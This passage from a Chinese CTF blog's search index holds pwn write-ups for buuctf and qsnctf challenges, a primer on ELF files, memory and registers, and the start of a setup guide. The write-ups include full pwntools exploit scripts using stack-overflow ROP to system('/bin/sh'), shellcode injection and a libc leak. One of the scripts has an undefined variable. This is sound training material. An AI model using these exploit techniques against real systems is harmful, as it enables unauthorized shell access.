count);\n```\n\nfd.、.buf.、.count分别对应edi，rsi和edx三个寄存器。那么ssize_t类型的返回值去哪里了？\n\n我们做一个实验，其实有理论可以直接说，不过实验对于我而言印象会更深刻。\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_7.png)\n\n我们写一个带有返回值的函数，然后编译之后gdb调试一下：\n\n![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_8.png)![](/img/filesimg/mrctf2020_shellcode/mrctf2020_shellcode_9.png)\n\n当我们把`add`中的return给运行完的时候，返回值也就是10+20==30，30也就是0x1e的值出现在了rax寄存器上，也就是说，我这个函数运行完之后的返回值会返回到rax寄存器上。而`_read`函数的返回值是读取了多少数据他就返回多少，于是乎在我们运行完之后，rax的值变成了0x0A。\n\n也就是说，返回值会默认给0x0A。所以我可以逆向一下，大概源程序的代码是这样的：\n\n```c\n#include <stdio.h>\n\nint main() {\n    setbuf(0,0);\n    setbuf(0,0);\n    setbuf(0,0);\n    char str[410];\n    if(read(0,str,0x400)>0)\n        call(str);\n    return 0;\n}\n```\n\n这个只是伪C代码，大概这样写不能还原题目。就这样吧...\n\n","tags":["shellcode","PWN的writeup","buuctf"],"categories":["PWN不出来"]},{"title":"jarvisoj_level2_64","url":"//docx/jarvisoj_level2_64/","content":"> ROP-ret2text，栈溢出\n>\n> [https://buuoj.cn/challenges#jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)\n>\n\n是[jarvisoj_level2](/docx/jarvisoj_level2/)的64版本。\n\n按照32位的思路，我们找一下system函数和“/bin/sh”即可。\n\n![](/img/filesimg/jarvisoj_level2_64/jarvisoj_level2_64_0.png)\n\n![](/img/filesimg/jarvisoj_level2_64/jarvisoj_level2_64_1.png)\n\n`system_addr = 0x00000000004004C0`\n\n`binsh_str_addr = 0x0000000000600A90`\n\n![](/img/filesimg/jarvisoj_level2_64/jarvisoj_level2_64_2.png)\n\n这边的buf栈帧变为128了，需要改一下。其他32位中所有的占4字节的都变成8字节例如`saved registers`。\n\n然后，在64位里面，所谓的“形式参数”不再是存储在栈中而是存储在了rdi里面。如图中鼠标指出的所示（因为byd每次截图都截不到只能用手机拍了）\n\n![](/img/filesimg/jarvisoj_level2_64/jarvisoj_level2_64_3.png)\n\n所以我们要把`0x0000000000600A90`传递给rdi才行。\n\n![](/img/filesimg/jarvisoj_level2_64/jarvisoj_level2_64_4.png)\n\n通过ropper很轻松就能找到这行数据。并且后面还有一个ret我们刚好可以用到。\n\n其payload构造思路也变成了：\n\n![画板](/img/filesimg/jarvisoj_level2_64/jarvisoj_level2_64_5.png)\n\n整个流程就是：先调用pop rdi，在rdi里面塞入/bin/sh的值，随后需要一个ret地址，塞入system地址之后ret指令跳转到system地址。而system会直接调用rdi里面的值，rdi已经变成/bin/sh了。\n\nexp:\n\n```python\nfrom pwn import *\nfile_path = './jarvisoj_level2_x64'\ncontext(log_level = 'debug', binary=file_path, os = 'linux')\n\nip='nnode5.buuoj.cn'\nport=27500\n\n# p = remote(ip,port)\np = process(file_path)\nelf = ELF(file_path)\n\nsystem_addr=0x00000000004004C0\nsystem_plt = elf.plt['system']\nprint(system_plt)\nbinsh_str_addr=0x600A90\npop_rdi_ret_addr=0x4006b3\npayload = b'a'*(0x88)+p64(pop_rdi_ret_addr)+p64(binsh_str_addr)+p64(system_plt)\nprint(payload)\np.sendafter('Input:',payload)\np.interactive()\n```\n\n后记：我的ubuntu似乎是有点太新了。本地打不通但是远程可以。\n\n","tags":["PWN的writeup","buuctf","ret2系列"],"categories":["PWN不出来"]},{"title":"jarvisoj_level2","url":"//docx/jarvisoj_level2/","content":"\n> ROP-ret2text，栈溢出\n>\n> [https://buuoj.cn/challenges#jarvisoj_level2](https://buuoj.cn/challenges#jarvisoj_level2)\n>\n\n首先checksec一下：\n\n![](/img/filesimg/jarvisoj_level2/jarvisoj_level2_0.png)\n\n32位，有栈堆不可执行。\n\n![](/img/filesimg/jarvisoj_level2/jarvisoj_level2_1.png)\n\nmain函数调用了system函数，说明我们可以知道system函数的地址，找一下：\n\n![](/img/filesimg/jarvisoj_level2/jarvisoj_level2_2.png)\n\n`system_addr = 0x08048320`\n\n再看一下main函数中调用的另外一个函数`vulnerable_function()`\n\n![](/img/filesimg/jarvisoj_level2/jarvisoj_level2_3.png)\n\n非常明显的栈溢出。\n\n回忆一下栈帧结构：\n\n![](/img/filesimg/jarvisoj_level2/jarvisoj_level2_4.png)\n\n在这里，我们首先溢出覆盖vulnerable_function()函数的返回地址，将返回地址修改成system函数，然后再往system函数里面塞入参数“/bin/sh”即可。\n\n![](/img/filesimg/jarvisoj_level2/jarvisoj_level2_5.png)![](/img/filesimg/jarvisoj_level2/jarvisoj_level2_6.png)\n\n在system函数的栈帧结构是这样的：command参数在返回地址的上面，所以我们的payload的构造思路是这样的：\n\n![画板](/img/filesimg/jarvisoj_level2/jarvisoj_level2_7.png)\n\n然后还需要一个参数“/bin/sh”，非常好的是我们不需要自己构造了，在Strings视图里面找到了一个存有此参数的地址，我们直接把这个地址塞进去即可。`0x0804A024`\n\n![](/img/filesimg/jarvisoj_level2/jarvisoj_level2_8.png)\n\nexp:\n\n```python\nfrom pwn import *\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\n\nip='node5.buuoj.cn'\nport=28815\nfile_addr = './jarvisoj_level2'\n\np = remote(ip,port)\n# p = process(file_addr)\nelf = ELF(file_addr)\n\nsystem_addr=0x08048320\nbinsh_str_addr=0x0804A024\npayload = b'a'*(136+4)+p32(system_addr)+b'a'*4+p32(binsh_str_addr)\nprint(payload)\np.send(payload)\np.interactive()\n```\n\n\n\n","tags":["PWN的writeup","buuctf","ret2系列"],"categories":["PWN不出来"]},{"title":"jarvisoj_level1","url":"//docx/jarvisoj_level1/","content":"> ROP-ret2syscall，栈溢出\n>\n> [https://buuoj.cn/challenges#jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)\n>\nchecksec\n\n![](/img/filesimg/jarvisoj_level1/jarvisoj_level1_0.png)\n\n![](/img/filesimg/jarvisoj_level1/jarvisoj_level1_1.png)\n\n![](/img/filesimg/jarvisoj_level1/jarvisoj_level1_2.png)\n\n保护全关，32位系统。其中一开始会输出buf的地址\n\n这个逻辑很简单，我先输入shellcode，然后栈溢出，返回到栈上的buf地址运行即可。\n\nexp：\n\n```python\nfrom pwn import *\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\n\nip='ip_addr'\nport=1111\nfile_addr = './jarvisoj_level1'\n\n# p = remote(ip,port)\np = process(file_addr)\nelf = ELF(file_addr)\n\nbuf_addr = int(p.recvline()[len(\"What's this:\")+2:-2],16)\nprint(buf_addr)\npayload = asm(shellcraft.sh())\npayload += b'a'*(136-len(payload)+4)\npayload += p32(buf_addr)\n\np.send(payload)\np.interactive()\n```\n\n这个线上似乎没有setbuf，所以输入和输出有点小问题。\n\n![](/img/filesimg/jarvisoj_level1/jarvisoj_level1_3.png)\n\n似乎需要我先输入什么才会有反应...\n\n妈的，虽然是题目的bug，但是也不是没有解决方案。我么构造这么一个payload流程：\n\n![画板](/img/filesimg/jarvisoj_level1/jarvisoj_level1_4.png)\n\n他似乎收到回车才会输出地址，那么我就先输入一堆东西然后回车，这样他就会输出地址，又会再次返回到vulnerable函数中再输出一次地址，这个时候我再输入shellcode+返回地址为buf。他就可以去buf执行了。\n\n似乎还是不行...\n\n还有一个libc的办法来做，思路是这样的：\n\n构造rop调用write函数来泄露libc的基地址，并且再次调用main函数，根据libc的基址得到system和/bin/sh字符串地址，然后再次利用漏洞构造rop调用system('\\bin\\sh')即可。\n\n![画板](/img/filesimg/jarvisoj_level1/jarvisoj_level1_5.png)\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\n\nip='node5.buuoj.cn'\nport=28043\nfile_addr = './jarvisoj_level1'\np = remote(ip,port)\n# p = process(file_addr)\nelf = ELF(file_addr)\nmain_addr=0x80484b7\nwrite_plt=elf.plt['write']\nwrite_got=elf.got['write']\n\n\npayload =b'a' * (0x88 + 0x4 ) + p32(write_plt) + p32(main_addr) +p32(0x1)+p32(write_got)+p32(0x4) \np.send(payload)\nwrite_addr = u32(io.recv(4))\nlibc=LibcSearcher('write',write_addr)\t\nlibc_base=write_addr-libc.dump('write')\nsystem_addr=libc_base+libc.dump('system')\nbin_sh=libc_base+libc.dump('str_bin_sh')\npayload =b'a' * (0x88 + 0x4) + p32(system_addr) + p32(main_addr)+ p32(bin_sh)\n\np.send(payload)\np.interactive()\n```\n\n","tags":["PWN的writeup","buuctf","ret2系列"],"categories":["PWN不出来"]},{"title":"easy-shellcode","url":"//docx/easy-shellcode/","content":"> 类型：shellcode、栈溢出\n>\n> [https://www.qsnctf.com/](https://www.qsnctf.com/)  题目叫做：**<font style=\"color:rgba(0, 0, 0, 0.88);background-color:rgb(246, 249, 253);\">Easy_Shellcode</font>**\n>\n\n![](/img/filesimg/easy-shellcode/easy-shellcode_0.png)\n\n![](/img/filesimg/easy-shellcode/easy-shellcode_1.png)\n\n输入然后栈中执行，一开始的时候会输出v4的地址。\n\n![](/img/filesimg/easy-shellcode/easy-shellcode_2.png)\n\nPIE每次会随机地址，但是按照人类逻辑的最前面三位不动。通过0x7ff将后面的值全部获取。再return到这里执行shellcode即可。\n\nexp:\n\n```python\nfrom pwn import *\n\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\n\n\nip='challenge.qsnctf.com'\nport=34976\nfile_addr = './easy-shellcode'\n\n\np = remote(ip,port)\n\n# p = process(file_addr)\nelf = ELF(file_addr)\n\nv4_addr=int(p.recvline()[2:],16)\nprint(v4_addr)\nshellcode = asm(shellcraft.sh())\npayload = shellcode\npayload += b'\\x90'*(0x100-len(shellcode)+8)+p64(v4_addr)\n# print(payload)\np.send(payload)\np.interactive()\n\n```\n\n","tags":["shellcode","PWN的writeup","栈溢出","qxnctf"],"categories":["PWN不出来"]},{"title":"overflow_ez_32","url":"//docx/overflow_ez_32/","content":"首先checksec：\n\n![](/img/filesimg/overflow_ez_32/overflow_ez_32_0.png)\n\n保护全关，一般保护全关的题目要么特别简单要么特别难。很显然（因为这是我自己做的题），这个是前者。（当然不是所有带有ez的题目都很ez）（但是这个是真ez）\n\n直接拖到ida一探究竟。\n\n![](/img/filesimg/overflow_ez_32/overflow_ez_32_1.png)\n\n有一个main函数和一个back_door，还有一个overflow和init函数，backdoor里面是一个超级大后门：\n\n![](/img/filesimg/overflow_ez_32/overflow_ez_32_2.png)\n\nmain函数里面是init和overflow，一个是初始化，还有一个是一个最简单的栈溢出：\n\n![](/img/filesimg/overflow_ez_32/overflow_ez_32_3.png)\n\n如图可见，这里有一个不安全的`gets`函数，然后有一个s变量。\n\n![](/img/filesimg/overflow_ez_32/overflow_ez_32_4.png)\n\n点进去之后我们就能发现，从-0x18到+0x04都是本栈帧的模样，然后要输入0x18个字节覆盖char字符串`s`和一个`var_4`，输入4个字节覆盖saved register，最后输入4字节的地址来覆盖return地址。\n\n所需要的地址就是我们的backdoor函数地址...\n\n![](/img/filesimg/overflow_ez_32/overflow_ez_32_5.png)\n\nbackdoor的位置在`0x080491F0`这个位置上，当然我们也可以填入`0x08049211`这个地址，这样可以跳过上面那个`puts`函数的调用。不过这里没必要，我们就以backdoor的地址为需要进入的地址：\n\nexp：\n\n```python\nfrom pwn import *\n#32\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\nfile_addr = './overflow_ez_32'\np = process(file_addr)\nelf = ELF(file_addr)\n\nbackdoor_addr = 0x080491F0\npayload = b'a'*0x18\npayload += b'a'*0x04\npayload += p32(backdoor_addr)\nprint(payload)\np.sendafter(b'door?\\n',payload)\np.interactive()\n```\n\n非常简单。\n\n","tags":["PWN的writeup","栈溢出","nxctf"],"categories":["PWN不出来"]},{"title":"pwn及计算机原理基础知识","url":"//docx/pwn及计算机原理基础知识/","content":"\n# PWN是什么\nPWN是一个俗语，每次攻破某个服务或者系统就是“pwn进去了”，也就是：\n\n破解、利用成功（二进制漏洞） \n\n攻破（设备、服务器）\n\n控制（设备、服务器）\n\n流程如下：\n\nExploit：用于攻击的脚本和方案 \n\nPayload：攻击载荷，也就是构造的恶意数据 \n\nShellcode：调用攻击目标shell的代码\n\n# 二进制基础\n## C语言编译流程\nc/c++在整个世界里面就和超级搅屎棍一样，一方面因为他真的很优秀，一方面因为时代局限性，导致有很多含有漏洞的程序在世界各处到处都有。\n\n当我拥有一个c语言程序，例如：\n\n```c\n#include<stdio.h>\nint main(){\n    puts(\"Helloworld\");\n    return 0;\n}\n```\n\n我们对他进行编译：\n\n```shell\ngcc helloworld.c\n```\n\n就可以得到一个二进制程序a.out\n\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_0.png)\n\na.out的内容如下：\n\n```plain\n@ @@@���uu   ���-�=�=X`�-�=�=�8880hhh��S�td8880P�td   44Q�tdR�td�-�=�=HH/lib64/ld-linux-x86-64.so.2 GNU���GNU\n          ����c�e���w��U+``~���FDO{\"type\":\"deb\",\"os\":\"ubuntu\",\"name\":\"glibc\",\"version\":\"2.40-1ubuntu3.1\",\"architecture\":\"amd64\"}GNU��e�mH d s \"puts__libc_start_main__cxa_finalizelibc.so.6GLIBC_2.2.5GLIBC_2.34_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable'u�i        1���=�@�?�?�?�?�?�?��H�H��/H��t��H���5�/�%�/@��h�����f����%�/fD���%v/fD��1�I��^H��H���PTE1�1�H�=��S/�f.�H�=y/H�r/H9�tH�6/H��t        �����H�=I/H�5B/H)�H��H��?H��H�H��tH�/H����fD�����=/u+UH�=�.H��t\n                                                                               H�=�.�����d�����.]������w�����UH��H��H��������]���H�H��helloworld4���h0����@����P���P9����zRx\n                                                                        ����&D$4���� FJ\n                                                                                       �?�9*3$\"\\���Ut�����q���E�C\n@'\nh������o �H\n�\n �?��  ������o����o���o~���o�=@GCC: (Ubuntu 14.2.0-4ubuntu2) 14.2.0��        � ��� �3IU�=|@��=������� ��Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryhelloworld.c__FRAME_END___DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_start_main@GLIBC_2.34_ITM_deregisterTMCloneTableputs@GLIBC_2.2.5_edata_fini__data_start__gmon_start____dso_handle_IO_stdin_used_end__bss_startmain__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5_init.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.package.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment#886hh$I��pW�� e���o  o\n�  �  4�H H ����=�-                          Hw������o~~����o�����B��   �@@�PP�``�hh\n                �=���?�@@00%80` �3�x5(\n```\n\n我们可以从中看到一些看得懂的和大量看不懂的内容，其中绝大部分都是无法查看的二进制数据（机器码），而那些可以看出来的二进制数据，可以看到许多信息。这到底是什么文件呢，我们可以file一下。\n\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_1.png)\n\n我们可以发现他是一个ELF（linux下可执行文件格式），64位的文件。\n\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_2.png)\n\n如图所示，C语言到可执行程序的流程也就是_**编译(compilier)，汇编(assembler)，**_和_**链接（linker)**_\n\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_3.png)\n\n# 可执行文件\n## 什么是可执行文件\n  广义上，可执行文件就是可以执行的文件，比如说python文件在python环境下就可以直接执行（因为他是一个脚本）。\n\n  狭义上，可执行文件必须是一个经历过编译，汇编和链接后得到的二进制文件，并且在环境合适的情况下可以直接打开运行。也就是说CPU可以直接认识，比如.out\\.exe\\.dll\\.so文件\n\n  所谓的二进制漏洞，都是在狭义上的程序中的漏洞。\n\n### 可执行文件的分类\n    Windows为**PE（portable Executable）**\n\n可执行程序：.exe \n\n动态链接库：.dll \n\n静态链接库：.lib\n\n    Linux为**ELF（Executable and Linkable Format）**\n\n可执行程序：.out \n\n动态链接库：.so \n\n静态链接库：.a\n\n## ELF文件、内存加载和虚拟内存\n### ELF文件结构\n  **段视图（**_<font style=\"color:rgb(143,149,158);\">Segment View</font>_**）**：用于进程在内存区域中读、写、执行（rwx）权限划分\n\n  **节视图（**_<font style=\"color:rgb(143,149,158);\">Section View</font>_**）**：一个ELF文件编译链接时候，在磁盘上存储时的文件结构组织\n\n  一个段可包含多个节，节是段的细分单元。(不准确，映射关系中，进入内存后看起来段是高于节的）\n\n   不过大部分时候，不是严格区分成两个部分的，而是要根据不同的需求做不同的分析的。\n\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_4.png)\n\n  比如说在程序从普通存储在硬盘状态到内存中运行的状态，就要从一种段视图的角度转移到节视图。如图所示，一个存储在Disk的程序变为进程进入Memory的时候，其中_**可读可写的.data.bss.got.plt段 **_就变成了Memory中的 _**Data节**_ ，很显然，Code节也是一样的由多个段组成的。而程序运行后又产生了新的节，例如stack（栈）和heap（堆）部分...\n\n### 虚拟内存\n  程序在调试的时候需要查看内存里面的内容，但是很可惜真实的内存因为一些机制难以查看。\n\n  在硬件层面，cpu和memory之间互相沟通没有问题，但是作为程序员是没有办法和硬件沟通的，于是通过OS，OS将物理内存（memory）给抽象出来。\n\n  OS通过软件机制将物理内存、外存（硬盘）等资源整合后，向程序员呈现的 “逻辑内存”。\n\n#### 地址空间的隔离与映射\n    _**虚拟内存用户空间每个进程各一份，**_每个程序各自占用独立的空间，例如在32位系统中，默认会划分给2^32byte，也就是4GB空间的大小。\n\n    将CPU中的内存管理单元（MMU）和OS维护的页表（Page Table）实现映射。\n\n  因为所有的数据都需要内核，因此_**虚拟内存内核空间所有进程共享一份**_\n\n  最后，_**虚拟内存mmap段中的动态链接库（glibc）仅在物理内存中装载一份**_。虽然在每个程序的虚拟内存中都存在一份。\n\n### 内存空间\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_5.png)\n\n    如图所示，32位和64位的系统分别创造出来的空间大小各不相同。依次介绍一下分出来的各个部分分别是干嘛的。\n\n    首先是Kernel Space，就是映射出来的内核空间。\n\n    stack和heap都是动态存储各种数据的地方。\n\n    下面都是静态存储区。\n\nRW段（可读可写，一般是.bss.data等) \n\nReadOnly段（只读，例如.init_array、.fini_array等） \n\nRE段（可读可执行，一般是.init、.rodata、.text等)\n\n    Reserved是保留部分。\n\n### 段（segment）与节（section）概述\n#### 1. 代码段（Text segment）\n    功能：存储代码与只读数据(ReadOnly)\n\n    包含节：\n\n      `<font style=\"background-color:rgb(187,191,196);\">.text</font>` 节（核心代码存储） `<font style=\"background-color:rgb(187,191,196);\">.rodata</font>` 节（只读常量，如字符串字面量 ） `<font style=\"background-color:rgb(187,191,196);\">.hash</font>` 节（符号哈希表，辅助符号查找 ） `<font style=\"background-color:rgb(187,191,196);\">.dynsym</font>` 节（动态链接符号表 ） `<font style=\"background-color:rgb(187,191,196);\">.dynstr</font>` 节（动态链接符号名字符串 ） `<font style=\"background-color:rgb(187,191,196);\">.plt</font>` 节（过程链接表，用于延迟绑定 ） `<font style=\"background-color:rgb(187,191,196);\">.rel.got</font>` 节（全局偏移表重定位信息 ）\n\n#### 2. 数据段（Data segment）\n    功能：存储可读可写数据(Read Write)\n\n    包含节：\n\n      `<font style=\"background-color:rgb(187,191,196);\">.data</font>` 节（已初始化全局 / 静态变量 ） `<font style=\"background-color:rgb(187,191,196);\">.dynamic</font>` 节（动态链接相关信息，如依赖库 ） `<font style=\"background-color:rgb(187,191,196);\">.got</font>` 节（全局偏移表，加速地址访问 ） `<font style=\"background-color:rgb(187,191,196);\">.got.plt</font>` 节（针对 plt 的全局偏移表 ） `<font style=\"background-color:rgb(187,191,196);\">.bss</font>` 节（未初始化 / 初始化为 0 的全局 / 静态变量，运行时分配内存 ）\n\n#### 3. 栈段（Stack segment）\n    通常用于函数调用上下文、局部变量存储，由系统自动管理栈帧分配与释放\n\n## 程序数据如何在内存中组织\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_6.png)\n\n一开始，有两个全局变量。其中glb存放在内存中的.Bss节部分（因为他没有被初始化）。Bss的其中之一的作用就是存储未初始化的变量。在运行时候分配内存（静态变量也是如此）。\n\n而在char* str中，其中str放在了Data节部分，也就是已经被初始化的变量存储部分。然后\"Helloworld\"因为是一个字符串，一个只读数据，所以就被放在了Text段中（一般是Text段里面的.rodata节）\n\n然后所有的函数存放在了Text段的text节里面，例如sum、main等等。在程序运行中，所有在函数中的变量（函数的内存开销）都被放在了Stack，也就是栈里面。\n\n在程序中有void* ptr=malloc(0x100);其中这个0x100的空间就通过malloc申请到Heap里面了。如此这般，read函数读取到的\"deadbeef\"就被读取到Heap里面存储着了，也就是堆里。\n\n### 大端序和小端序\n**小端序** 低地址存放数据低位，高地址存放数据高位。主流格式\n\n**大端序** 低地址存放数据高位，高地址存放数据低位\n\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_7.png)![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_8.png)\n\n比如说我现在\n\n```c\nchar* str = \"ABC\";\n```\n\n就可以得到【ABC\\0】这个字符串，分别的ASCII码的十六进制是41,42,43,00,合在一起数据就变成了\"00434241\"。\n\n其中数据最低位为41，数据最高位为00。数据低位放在内存低位，数据高位内存高位（如小端序解释图所示）。\n\n## 程序的装载与进程的执行\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_9.png)\n\n越靠近CPU的存储器，速度越快，价格越高昂，而且存储空间越小。而Register（寄存器）就是一个速度极快的存储器。\n\n## 寄存器\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_10.png)\n\n寄存器一共就四个任务：\n\n第一是把**数据存到寄存器**中 \n\n第二是把**寄存器**中的东西**存放到另一个寄存器**上 \n\n第三是把内存中**地址上数据**获取后**存放到寄存器**中 \n\n第四是把**寄存器的数据存到地址上**去\n\n### 一、amd64 寄存器结构（以 RAX 为例的分级访问）\namd64 架构中，`<font style=\"background-color:rgb(187,191,196);\">RAX</font>` 是 8 字节（64 位）通用寄存器，支持向下兼容的分级访问：\n\n+ `<font style=\"background-color:rgb(187,191,196);\">rax</font>`：完整 8 字节（64 位）寄存器，可存 64 位数据。\n+ `<font style=\"background-color:rgb(187,191,196);\">eax</font>`：低 4 字节（32 位），兼容 32 位程序，存 `<font style=\"background-color:rgb(187,191,196);\">rax</font>` 的低 32 位数据。\n+ `<font style=\"background-color:rgb(187,191,196);\">ax</font>`：低 2 字节（16 位），兼容 16 位程序，存 `<font style=\"background-color:rgb(187,191,196);\">rax</font>` 的低 16 位数据。\n+ `<font style=\"background-color:rgb(187,191,196);\">ah</font>`：`<font style=\"background-color:rgb(187,191,196);\">ax</font>` 的高 1 字节（8 位），存 `<font style=\"background-color:rgb(187,191,196);\">ax</font>` 的高 8 位。\n+ `<font style=\"background-color:rgb(187,191,196);\">al</font>`：`<font style=\"background-color:rgb(187,191,196);\">ax</font>` 的低 1 字节（8 位），存 `<font style=\"background-color:rgb(187,191,196);\">ax</font>` 的低 8 位。\n\n这种设计让程序能灵活处理不同位数的数据（64/32/16/8 位），适配旧代码兼容需求。\n\n### 二、部分寄存器的功能\n1. RIP（程序计数器指针寄存器）（Program Counter）\n    1. 存当前下一条指令的偏移地址。\n2. RSP（栈指针寄存器）\n    1. 存当前栈帧的栈顶偏移地址，栈是 “后进先出” 的内存区域（如函数调用时局部变量、返回地址的存储 ），`<font style=\"background-color:rgb(187,191,196);\">RSP</font>` 随栈操作（`<font style=\"background-color:rgb(187,191,196);\">push</font>`/`<font style=\"background-color:rgb(187,191,196);\">pop</font>` ）动态变化，始终指向栈顶位置。\n3. RBP（基址指针寄存器）\n    1. 存当前栈帧的栈底偏移地址，用于定位栈内数据（如函数局部变量相对于栈底的偏移 ），辅助访问栈帧中的内容，常配合 `<font style=\"background-color:rgb(187,191,196);\">RSP</font>` 管理函数调用栈。\n4. RAX（通用寄存器）\n    1. 作为通用寄存器，可临时存各种数据；特殊功能是存放函数返回值（如 C 语言中 `<font style=\"background-color:rgb(187,191,196);\">int</font>`/`<font style=\"background-color:rgb(187,191,196);\">long long</font>` 等类型的返回值，会通过 `<font style=\"background-color:rgb(187,191,196);\">RAX</font>` 传递 ）。\n\n## 静态链接的程序的执行过程\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_11.png)\n\n### fork函数\n当我们开始运行程序的时候，随后运行fork()函数\n\n`fork()`在这张图的意思大概如下：我运行一个`helloworld`程序，需要用到一些内核`kernel`的东西。于是乎在我运行，也就是 `$ ./binary`的时候，shell使用fork函数复制自己，他会在父进程（也就是我的系统）中分裂出一个子进程（也就是`./binary`程序）。然后当子进程需要用到和修改父进程（`kernel`中的内容）的时候，`fork`函数就会复制一份数据（在初始阶段共享所有的数据（全局、 栈区、 堆区、 代码）)到子进程中。所以在程序运行的时候，`fork`函数就是做这个的。\n\n再单独解释一下`fork`函数，它的作用是从主进程中分裂出一个进程，他们之间是父子进程的关系。然后`fork`函数会返回一个int类型，这个int类型就是进程号。\n\n`fork`调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：\n\n  在父进程中，`fork`返回新创建子进程的进程ID； 在子进程中，`fork`返回0； 如果出现错误，`fork`返回一个负值；\n\n因此我们可以通过`fork`返回的值来判断当前进程是子进程还是父进程。（注： `fork `调用生成的新进程与其父进程谁先执行不一定，哪个进程先执行要看系统的进程调度策略）\n\n### execve函数\n当然上述过程只是创建了一个进程，而进程中没有需要运行的内容，execve函数就是用来把`./binary`里面的内容（也就是需要运行的程序本身）放到子进程中的\n\n子进程调用 `execve(\"./binary\", argv[], envp[])` ，目的是用新程序（`./binary` ）替换当前子进程的内存空间：\n\n`argv[]`：传递程序运行参数（比如 `./binary arg1 arg2` 里的参数 ）。 `envp[]`：传递环境变量（比如 `PATH``HOME` 等 ）。\n\n#### 内核态切换与处理\n`execve()` 会触发系统调用，进入内核态（Kernel mode）：\n\n  先调用 `sys_execve()` （内核层的系统调用处理函数 ），再调用 `do_execve()` 。\n\n  `do_execve()` 会执行 `search_binary_handler()` ，作用是查找能处理该可执行文件的加载器（因为是静态链接的 ELF 文件，会找到 ELF 加载器 ）。\n\n  找到后调用 `load_elf_binary()` ，负责加载 ELF 文件到内存（解析文件头、分配内存、加载代码段 / 数据段等 ）。\n\n### sys_execve()和do_execve()\n简单来说，`<font style=\"background-color:rgb(187,191,196);\">sys_execve()</font>` 是系统调用处理函数，是用户态到内核态的接口之一。在 Linux 内核里，每个系统调用都有对应的处理函数，`<font style=\"background-color:rgb(187,191,196);\">sys_execve()</font>` 就是处理 `<font style=\"background-color:rgb(187,191,196);\">execve()</font>` 系统调用的函数，对用户请求进行初步审核和预处理；而 `<font style=\"background-color:rgb(187,191,196);\">do_execve()</font>` 则是是内核中真正执行程序加载和执行关键操作的函数，属于 `<font style=\"background-color:rgb(187,191,196);\">sys_execve()</font>` 处理流程的下一级，真正去操办程序加载运行的各项事务。\n\n它们共同协作，完成从用户请求运行程序到程序成功加载运行的整个过程。\n\n### search_binary_handler()和load_elf_binary()\n  `<font style=\"background-color:rgb(187,191,196);\">search_binary_handler()</font>`：负责识别文件格式，通过遍历格式处理器链表找到能处理当前文件的加载器。\n\n  `<font style=\"background-color:rgb(187,191,196);\">load_elf_binary()</font>`：负责 ELF 文件的具体加载，包括内存映射、环境设置、动态链接等，最终让程序得以执行。也就是让程序可以静态调试的主要函数。\n\n### _start和main()\n  没什么好说，就是启动后让用户可以看到程序的最后一步。\n\n## 动态连接的程序的执行过程\n![](/img/filesimg/pwn及计算机原理基础知识/pwn及计算机原理基础知识_12.png)\n\n相比于静态储存，多了一个`ld.so`和`__libc_start_main()`和`_init`。这些是额外处理共享库加载、初始化和运行时支持。\n\n分别依赖库是`ld.so`解决函数库地址映射关系之类的，加载是`__libc_start_main()`把这些东西放到，初始化是`_init`。\n\n","tags":["计算机原理","PWN攻略-前提"],"categories":["PWN不出来"]},{"title":"pwn基础配置","url":"//docx/pwn基础配置/","content":"\nubuntu系统和windows系统\n\n做pwn前需要准备的工具：\n\n# 一些虚拟机配置\n## 鼠标拖拽控制\n![](/img/filesimg/pwn基础配置/pwn基础配置_0.png)\n\n这个服务打开即可\n\n# 安装软件\nlinux需要在前面加sudo哈\n\n## 网络环境配置\n默认主机有clash或其他vpn工具。\n\n![](/img/filesimg/pwn基础配置/pwn基础配置_1.png)\n\n允许局域网和端口要记住并且打开，系统代理在你需要打开vpn的时候打开即可。\n\n虚拟机调为NAT连接模式。\n\n![](/img/filesimg/pwn基础配置/pwn基础配置_2.png)\n\n在ubuntu的settings中proxy（代理）调整为manual（手动），把http和https的proxy改成相应的URL和Port\n\n![](/img/filesimg/pwn基础配置/pwn基础配置_3.png)\n\n端口号就和前面的一样，URL就是vmware给虚拟机的地址，查看方式如图所示： \n\n![](/img/filesimg/pwn基础配置/pwn基础配置_4.png)\n\n# 基础环境配置\n## python3\n```plain\n#首先进入root模式\nsudo apt update\nsudo apt install python3\nsudo apt install python3-pip\nalias 